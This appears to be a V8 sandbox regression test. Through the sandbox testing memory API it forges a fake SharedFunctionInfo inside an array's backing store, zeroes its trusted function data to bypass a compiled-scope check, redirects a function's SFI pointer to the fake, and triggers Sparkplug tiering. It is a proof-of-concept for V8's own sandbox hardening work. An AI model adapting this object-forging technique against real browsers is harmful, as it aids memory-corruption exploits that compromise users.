// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --allow-natives-syntax --sandbox-testing

const kJSFunctionType = Sandbox.getInstanceTypeIdFor('JS_FUNCTION_TYPE');
const kJSArrayType = Sandbox.getInstanceTypeIdFor('JS_ARRAY_TYPE');
const kSharedFunctionInfoType =
    Sandbox.getInstanceTypeIdFor('SHARED_FUNCTION_INFO_TYPE');

const kJSFunctionSFIOffset =
    Sandbox.getFieldOffset(kJSFunctionType, 'shared_function_info');
const kJSArrayElementsOffset = Sandbox.getFieldOffset(kJSArrayType, 'elements');
const kSharedFunctionInfoTrustedFunctionDataOffset =
    Sandbox.getFieldOffset(kSharedFunctionInfoType, 'trusted_function_data');

function F1() {}

%EnsureFeedbackVectorForFunction(F1);
%CompileBaseline(F1);

// Use the new ExhaustInterruptBudget helper to set the tiering budget to 0
%ExhaustInterruptBudget(F1);

let f1_addr = Sandbox.getAddressOf(F1);

// Forge a fake SFI object inside a standard JSArray
let fake_sfi_array = [1.1, 2.2, 3.3, 4.4];
let fake_sfi_addr = Sandbox.getAddressOf(fake_sfi_array);

let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

// Read the real SharedFunctionInfo Map from F1's SFI
let real_sfi_ptr = memory.getUint32(f1_addr + kJSFunctionSFIOffset, true) & ~3;
let sfi_map = memory.getUint32(real_sfi_ptr, true);

// Find the elements backing store of the fake array
let elements_ptr =
    memory.getUint32(fake_sfi_addr + kJSArrayElementsOffset, true) & ~3;
let fake_obj_addr = elements_ptr + 8;  // Skip fixed array header

// Write the valid SFI Map to offset 0 of our fake object
memory.setUint32(fake_obj_addr, sfi_map, true);

// Write 0 to trusted_function_data to bypass is_compiled_scope
memory.setUint32(
    fake_obj_addr + kSharedFunctionInfoTrustedFunctionDataOffset, 0, true);

// Point F1's SFI pointer to our forged object
memory.setUint32(f1_addr + kJSFunctionSFIOffset, fake_obj_addr + 1, true);

// Trigger the Sparkplug budget interrupt naturally on return
F1();
